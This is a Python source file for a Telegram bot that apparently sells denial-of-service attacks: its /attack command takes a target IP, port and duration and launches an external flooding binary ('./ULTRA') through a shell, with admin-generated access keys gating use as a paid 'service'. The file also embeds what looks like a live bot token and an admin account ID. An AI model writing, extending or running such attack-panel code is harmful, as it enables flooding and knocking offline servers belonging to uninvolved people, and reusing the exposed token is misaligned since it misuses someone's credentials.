import os
import asyncio
import random
import string
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

# Use environment variable to securely store the bot token
TELEGRAM_BOT_TOKEN = os.getenv('7806814172:AAH2xJYOu9SPNh53xjt2rZM1uklRSujnpBs')  # Make sure to set this environment variable

# Store the keys (in a dictionary for simplicity)
generated_keys = {}

# Admin user ID (set to your user ID, this restricts the /genkey command to only you)
ALLOWED_ADMIN_ID = 6135948216  # Replace with your admin user ID

# Function to generate a random key
def generate_key():
    # Generate a 16-character random key with uppercase, lowercase letters and digits
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*\n\n"
        "*Use /genkey to generate a key and /redeem <key> to redeem it!*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./ULTRA {ip} {port} {duration} 20",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    if not ip.replace(".", "").isdigit() or not (1 <= len(ip.split(".")) <= 4):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid IP format!*", parse_mode='Markdown')
        return

    if not port.isdigit() or not (1 <= int(port) <= 65535):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid port number!*", parse_mode='Markdown')
        return

    if not duration.isdigit() or int(duration) <= 0:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid duration! It must be a positive number.*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

# /genkey command to generate a key for the user
async def genkey(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the user's ID

    # Check if the user is the admin
    if user_id != ALLOWED_ADMIN_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    # Generate a unique key
    key = generate_key()

    # Store the key in the generated_keys dictionary with the user's ID
    generated_keys[key] = user_id

    # Send the key to the user
    await context.bot.send_message(chat_id=chat_id, text=f"*Your unique key is:* `{key}`", parse_mode='Markdown')

# /redeem command to redeem a key
async def redeem(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the user's ID

    if not context.args:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <key>*", parse_mode='Markdown')
        return

    key = context.args[0]  # Get the key from the command argument

    # Check if the key is valid and belongs to the user
    if key in generated_keys and generated_keys[key] == user_id:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Key redeemed successfully! You have access to the service.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid or expired key!*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("genkey", genkey))  # Only admin can use this
    application.add_handler(CommandHandler("redeem", redeem))

    application.run_polling()

if __name__ == '__main__':
    main()
